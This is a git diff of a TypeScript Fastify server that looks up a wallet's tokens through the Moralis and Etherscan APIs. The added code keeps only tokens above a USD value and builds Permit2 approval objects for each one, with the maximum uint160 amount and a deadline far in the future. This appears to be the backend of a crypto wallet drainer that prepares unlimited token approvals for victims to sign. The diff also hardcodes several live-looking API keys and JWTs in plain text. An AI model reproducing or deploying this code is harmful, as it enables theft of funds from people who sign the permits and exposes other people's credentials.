@@ -14,16 +14,29 @@ import { EvmChain } from "@moralisweb3/common-evm-utils";
 // └── hooks
 // └── your services
 //
+
 const moralisApiKey1 =
   "5M2C1HGJJnTiyMnp96IpaIlZ6CPVRA7yxysQY38AI1fDse7p3K6EcIRSOWwpSKCd";
 const moralisApiKey2 =
-  "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1AwH2SYO8";
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijg5MWJkNjBkLTBmYWItNDZmZi1hYjRjLTU1ODAyZWUwY2M4NyIsIm9yZ0lkIjoiMzQ5NzE5IiwidXNlcklkIjoiMzU5NDU4IiwidHlwZUlkIjoiOTUxZmMzZjAtYzk0YS00NjQzLWFmYjItZDYwMDYxMTI5ZGQxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAxMzM1NTcsImV4cCI6NDg0NTg5MzU1N30.gp4A6Y5iJZN2qNaJtV41Zz5DKf-CTywbc7Na-3Ks0oQ";
 const moralisApiKey3 =
-  "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
-
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU3MWVmYWU5LTQ1NTctNGMyMC1iNGM4LWJiYzM3MWRkMjA0NiIsIm9yZ0lkIjoiMzQ5OTAzIiwidXNlcklkIjoiMzU5NjQ2IiwidHlwZUlkIjoiY2M5NTA4OWQtM2QxYS00OGMzLThhYWUtNDE5NmU4M2NhZTgwIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAyMzU3MDUsImV4cCI6NDg0NTk5NTcwNX0.Ed2XbULv-DOKkXCOBKJsFbRFo55pFH3jeVpmCKCkc0Y";
+const moralisAPikey4 =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4";
 const moralisKeys: string[] = [moralisApiKey1, moralisApiKey2, moralisApiKey3];
+const selectedKey = moralisKeys[
+  Number(process.env.MORALIS_KEY_INDEX)
+] as string;
 const etherscanAPiKey1 = "NW9VZEP7IFW2ZQ4NYV6GPANWWX893ANUUE";
 const etherscanAPiKey2 = "QNKQHXZ31GI3F8NZAWVU4J6YSCQEV9J1BT";
+
+const deadline = 1000000000000;
+const nonce = 0; // still experimenting on this one;
+// const Permit2Contract =
+//   "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`; // Permit2 contract
+const maxUint160 = "1461501637330902918203684832716283019655932542975"; // maxUint160
+
+//
 export const app: FastifyInstance<Server, IncomingMessage, ServerResponse> =
   fastify({
     logger: true,
@@ -72,7 +85,8 @@ interface uid {
 const runMoralis = async () => {
   if (!moralis.Core.isStarted) {
     await moralis.start({
-      apiKey: moralisKeys[Number(process.env.MORALIS_KEY_INDEX)] || 2,
+      apiKey:
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
     });
     // console.log("moraliskeyIndex=>", process.env.MORALIS_KEY_INDEX);
   }
@@ -109,7 +123,8 @@ app.post<{
     headers: {
       accept: "application/json",
       "content-type": "application/json",
-      "X-API-Key": moralisKeys[Number(process.env.MORALIS_KEY_INDEX)],
+      "X-API-Key":
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
     },
     body: JSON.stringify({
       tokens: truncatedResponse,
@@ -145,7 +160,16 @@ app.post<{
   }
   const [filteredByUSDValue, error] = await useFetchTokenPrices();
   const tokensReturned = filteredByUSDValue as { token_address: string }[];
-
+  const tokenInPermitFormat: Array<{}> = [];
+  for (let index = 0; index < tokensReturned.length; index++) {
+    const obj = {
+      token: tokensReturned[index].token_address,
+      amount: maxUint160,
+      expiration: deadline,
+      nonce: nonce,
+    };
+    tokenInPermitFormat.push(obj);
+  }
   const addrs = [];
   for (let i = 0; i < tokensReturned.length; i++) {
     addrs.push(tokensReturned[i].token_address);
@@ -174,6 +198,6 @@ app.post<{
     }
   }
 
-  return [tokensReturned, _addrs];
+  return [tokenInPermitFormat, _addrs];
   // return tokensAddressOnly;
 });
